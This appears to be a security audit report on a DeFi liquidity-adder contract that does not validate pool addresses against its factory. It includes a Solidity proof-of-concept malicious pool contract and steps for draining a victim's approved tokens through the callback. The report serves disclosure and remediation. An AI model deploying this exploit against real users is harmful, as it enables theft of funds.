### Title
Unvalidated Arbitrary Pool Address in `MetricOmmPoolLiquidityAdder` Allows Malicious Pool to Drain Approved User Tokens via Callback — (`metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol`)

---

### Summary

`MetricOmmPoolLiquidityAdder` accepts a caller-supplied `pool` address in all four `addLiquidity*` entry points without verifying it against the factory's `isPool()` registry. A malicious pool contract can exploit the `metricOmmModifyLiquidityCallback` settlement path to pull any ERC-20 tokens the victim has approved to the adder, up to the caller-provided max caps, by returning attacker-controlled token addresses from `getImmutables()`.

---

### Finding Description

`MetricOmmPoolLiquidityAdder` explicitly documents the missing guard:

> "The caller is responsible for supplying a legitimate pool address and other non-malicious parameters. **This contract does not verify the pool against the factory**; a malicious pool can request token pulls up to the caller-provided max caps during callback settlement." [1](#0-0) 

By contrast, the sibling `MetricOmmSimpleRouter` enforces factory validation on every pool address before any interaction:

```solidity
function _requireFactoryPool(address pool) internal view {
    if (!FACTORY.isPool(pool)) revert IMetricOmmSimpleRouter.InvalidPool(pool);
}
``` [2](#0-1) 

`MetricOmmPoolLiquidityAdder` has no `FACTORY` immutable and no `isPool` check anywhere. The internal `_addLiquidity` flow is:

1. `_setPayContext(pool, payer, maxAmountToken0, maxAmountToken1)` — stores the attacker-supplied pool as the expected callback caller in transient storage.
2. `IMetricOmmPoolActions(pool).addLiquidity(...)` — calls the malicious pool.
3. The malicious pool immediately re-enters `metricOmmModifyLiquidityCallback(maxAmount0, maxAmount1, abi.encode(KIND_PAY))`. [3](#0-2) 

Inside the callback, all guards pass for a malicious pool:

- `kind == KIND_PAY` ✓ (attacker controls the calldata)
- `msg.sender == expectedPool` ✓ (malicious pool is the stored expected pool)
- `amount0Delta <= max0 && amount1Delta <= max1` ✓ (attacker sets amounts ≤ caps) [4](#0-3) 

Then the callback fetches token addresses from the malicious pool itself:

```solidity
PoolImmutables memory imm = IMetricOmmPool(msg.sender).getImmutables();
address token0 = imm.token0;
address token1 = imm.token1;
if (amount0Delta > 0) {
    pay(token0, payer, msg.sender, amount0Delta);
}
if (amount1Delta > 0) {
    pay(token1, payer, msg.sender, amount1Delta);
}
``` [5](#0-4) 

The `pay()` helper executes `IERC20(token).safeTransferFrom(payer, recipient, value)` — pulling `token0`/`token1` (attacker-chosen) from the victim's wallet to the malicious pool. [6](#0-5) 

---

### Impact Explanation

Any user who has approved `MetricOmmPoolLiquidityAdder` to spend their tokens (a prerequisite for using the contract) and is tricked into calling any `addLiquidity*` function with a malicious pool address loses up to `maxAmountToken0` of any ERC-20 token and `maxAmountToken1` of any other ERC-20 token. The malicious pool controls which tokens are pulled by returning arbitrary addresses from `getImmutables()`. This is a direct loss of user principal with no recovery path.

---

### Likelihood Explanation

`MetricOmmPoolLiquidityAdder` is a shared periphery contract; users must pre-approve it. A phishing front-end, a compromised UI, or a social-engineering attack substituting a malicious pool address for a legitimate one is a realistic trigger. The victim does not need to be technically sophisticated to be deceived — pool addresses are opaque 20-byte values that most users do not verify on-chain. The attack requires no privileged role, no special token behavior, and no flash loan.

---

### Recommendation

Add a factory reference to `MetricOmmPoolLiquidityAdder` (mirroring `MetricOmmSwapRouterBase`) and validate every caller-supplied pool address before storing it in the transient pay context:

```solidity
IMetricOmmPoolFactory internal immutable FACTORY;

constructor(address weth, address factory) PeripheryPayments(weth) {
    FACTORY = IMetricOmmPoolFactory(factory);
}

function _requireFactoryPool(address pool) internal view {
    if (!FACTORY.isPool(pool)) revert InvalidPool(pool);
}
```

Call `_requireFactoryPool(pool)` at the top of `_addLiquidity` and inside `addLiquidityWeighted` before the probe call.

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.35;

import {IMetricOmmPoolActions} from "@metric-core/interfaces/IMetricOmmPool/IMetricOmmPoolActions.sol";
import {IMetricOmmPool, PoolImmutables} from "@metric-core/interfaces/IMetricOmmPool/IMetricOmmPool.sol";
import {IMetricOmmModifyLiquidityCallback} from
    "@metric-core/interfaces/callbacks/IMetricOmmModifyLiquidityCallback.sol";
import {LiquidityDelta} from "@metric-core/types/PoolOperation.sol";
import {MetricOmmPoolLiquidityAdder} from
    "metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol";

/// @notice Malicious pool that drains victim tokens via the adder callback.
contract MaliciousPool {
    address public immutable stolenToken0;
    address public immutable stolenToken1;
    address public immutable adder;

    constructor(address _token0, address _token1, address _adder) {
        stolenToken0 = _token0;
        stolenToken1 = _token1;
        adder = _adder;
    }

    // Implements IMetricOmmPoolActions.addLiquidity — immediately calls back
    function addLiquidity(address, uint80, LiquidityDelta calldata, bytes calldata, bytes calldata)
        external
        returns (uint256, uint256)
    {
        // Callback with KIND_PAY (1) and max amounts
        IMetricOmmModifyLiquidityCallback(adder).metricOmmModifyLiquidityCallback(
            1_000e18, 1_000e18, abi.encode(uint8(1))
        );
        return (1_000e18, 1_000e18);
    }

    // Returns attacker-chosen token addresses
    function getImmutables() external view returns (PoolImmutables memory imm) {
        imm.token0 = stolenToken0;
        imm.token1 = stolenToken1;
    }
}

// In a test:
// 1. victim approves adder for USDC and WETH (type(uint256).max)
// 2. attacker deploys MaliciousPool(USDC, WETH, adder)
// 3. victim is tricked into calling:
//    adder.addLiquidityExactShares(
//        address(maliciousPool), victim, 0, deltas,
//        1_000e6,   // maxAmountToken0 = 1000 USDC
//        1_000e18,  // maxAmountToken1 = 1000 WETH
//        ""
//    );
// 4. MaliciousPool.addLiquidity fires → callback → pay(USDC, victim, maliciousPool, 1000e6)
//                                                  → pay(WETH, victim, maliciousPool, 1000e18)
// 5. victim loses 1000 USDC + 1000 WETH; malicious pool receives them.
```

### Citations

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L19-21)
```text
/// @dev The caller is responsible for supplying a legitimate pool address and other non-malicious parameters.
///      This contract does not verify the pool against the factory; a malicious pool can request token pulls up to
///      the caller-provided max caps during callback settlement.
```

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L162-167)
```text
    (address expectedPool, address payer, uint256 max0, uint256 max1) = _loadPayContext();
    if (expectedPool == address(0)) revert CallbackContextNotActive();
    if (msg.sender != expectedPool) revert InvalidCallbackCaller(msg.sender, expectedPool);
    if (amount0Delta > max0 || amount1Delta > max1) {
      revert MaxAmountExceeded(amount0Delta, amount1Delta, max0, max1);
    }
```

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L169-177)
```text
    PoolImmutables memory imm = IMetricOmmPool(msg.sender).getImmutables();
    address token0 = imm.token0;
    address token1 = imm.token1;
    if (amount0Delta > 0) {
      pay(token0, payer, msg.sender, amount0Delta);
    }
    if (amount1Delta > 0) {
      pay(token1, payer, msg.sender, amount1Delta);
    }
```

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L192-206)
```text
  ) internal returns (uint256 amount0Added, uint256 amount1Added) {
    _setPayContext(pool, payer, maxAmountToken0, maxAmountToken1);
    try IMetricOmmPoolActions(pool)
      .addLiquidity(positionOwner, salt, deltas, abi.encode(KIND_PAY), extensionData) returns (
      uint256 a0, uint256 a1
    ) {
      amount0Added = a0;
      amount1Added = a1;
      _clearPayContext();
    } catch (bytes memory reason) {
      _clearPayContext();
      assembly ("memory-safe") {
        revert(add(reason, 32), mload(reason))
      }
    }
```

**File:** metric-periphery/contracts/base/MetricOmmSwapRouterBase.sol (L87-89)
```text
  function _requireFactoryPool(address pool) internal view {
    if (!FACTORY.isPool(pool)) revert IMetricOmmSimpleRouter.InvalidPool(pool);
  }
```

**File:** metric-periphery/contracts/base/PeripheryPayments.sol (L85-87)
```text
    } else {
      IERC20(token).safeTransferFrom(payer, recipient, value);
    }
```
